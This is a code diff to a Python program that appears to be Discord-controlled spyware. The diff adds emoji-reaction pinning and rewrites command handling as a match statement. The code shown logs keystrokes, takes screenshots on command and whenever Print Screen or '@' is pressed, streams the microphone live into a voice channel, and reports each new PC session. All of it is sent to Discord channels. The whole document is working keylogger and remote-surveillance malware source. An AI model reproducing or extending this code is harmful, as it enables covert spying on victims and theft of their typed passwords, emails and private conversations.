@@ -68,10 +68,10 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
 @client.event
 async def on_ready():
     global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids
-    await client.get_channel(channel_ids['main']).send('||-||```[' + current_time() + '] New PC session```')
+    await client.get_channel(channel_ids['main']).send('||-||\n||-||\n||-||```[' + current_time() + '] New PC session```')
 
     recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())
-    print(recording_channel_last_message)
+
     if recording_channel_last_message.content != 'disable':
         Thread(target=start_recording).start()
         await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Starting recording...`')
@@ -99,18 +99,41 @@ async def on_ready():
         await asyncio.sleep(1)
 
 @client.event
+async def on_raw_reaction_add(payload):
+    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
+    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
+    user = payload.member
+    
+    if user.bot == False:
+        if str(reaction) == '📌':
+            await message.pin()
+            last_message = await discord.utils.get(message.channel.history())
+            await last_message.delete()
+
+@client.event
+async def on_raw_reaction_remove(payload):
+    message = await client.get_channel(payload.channel_id).fetch_message(payload.message_id)
+    reaction = discord.utils.get(message.reactions, emoji=payload.emoji.name)
+    user = payload.member
+
+    if str(reaction) == '📌':
+        await message.unpin()
+
+
+@client.event
 async def on_message(message):
     global channel_ids, vc
-    if message.content == '.ss':
-        ImageGrab.grab(all_screens=True).save('ss.png')
-        await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
-        os.system('del ss.png')
-
-    elif message.content == '.join':
-        await message.delete()
-        vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
-        vc.play(PyAudioPCM())
-        await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
+    match message.content:
+        case  '.ss':
+            await message.delete()
+            ImageGrab.grab(all_screens=True).save('ss.png')
+            reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
+            os.system('del ss.png')
+        case '.join':
+            await message.delete()
+            vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
+            vc.play(PyAudioPCM())
+            await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
 
 
 class PyAudioPCM(discord.AudioSource):
@@ -147,6 +170,7 @@ def on_press(key):
             case Key.backspace: processed_key = ' *`<`*'
             case Key.enter: processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
             case Key.print_screen|'@':
+                processed_key = ' *`Print Screen`*'
                 ImageGrab.grab(all_screens=True).save('ss.png')
                 embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == Key.print_screen else ' `[Email typing]`'), 'ss.png'])
         text_buffor += str(processed_key)
